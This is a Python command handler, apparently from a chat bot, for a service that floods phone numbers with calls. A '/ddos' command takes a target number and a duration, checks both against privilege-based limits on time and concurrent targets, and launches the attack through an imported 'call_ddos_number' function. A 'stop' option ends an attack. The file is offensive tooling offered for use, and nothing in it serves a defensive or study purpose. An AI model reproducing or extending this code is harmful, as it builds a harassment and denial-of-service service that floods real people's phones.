from settings.config import available_commands
from settings.response_info import info, errors
from tools.api import info_keyboard, messages_send_key
from tools.functionality import parse_number, get_ddos_numbers_by_user_id, call_ddos_number, stop_ddos_number


def permission_process(user_id: str, args: list, privilege: str) -> None:
    if args[0] == '/ddos':
        ddos(user_id, args, privilege)
    else:
        messages_send_key(user_id, errors['er_not_command'], info_keyboard())


def ddos(user_id: str, args: list, privilege: str):
    if len(args) == 3:
        if args[1] == 'stop':
            pr_number = parse_number(args[2])
            if pr_number is not None:
                stop_ddos_number(user_id, pr_number)
            else:
                messages_send_key(user_id, errors['er_stop_ddos'], info_keyboard())
            return

    if len(args) != 3:
        messages_send_key(user_id, errors['er_invalid_args'].format(args[0]), info_keyboard())
        return

    num = parse_number(args[1])
    if num is None:
        messages_send_key(user_id, errors['er_invalid_number'], info_keyboard())
        return

    time = int(args[2])
    limits = available_commands[privilege]['ddos']
    if time > limits['time']:
        messages_send_key(user_id, errors['er_no_priv_args'].format(time), info_keyboard())
        return

    ddos_numbers = get_ddos_numbers_by_user_id(user_id)
    if ddos_numbers is not None:
        if len(ddos_numbers) > limits['count']:
            messages_send_key(user_id, errors['er_limit_ddos_num'].format(ddos_numbers))
            return



    call_ddos_number(user_id, num, time, 15) # TODO make for threads

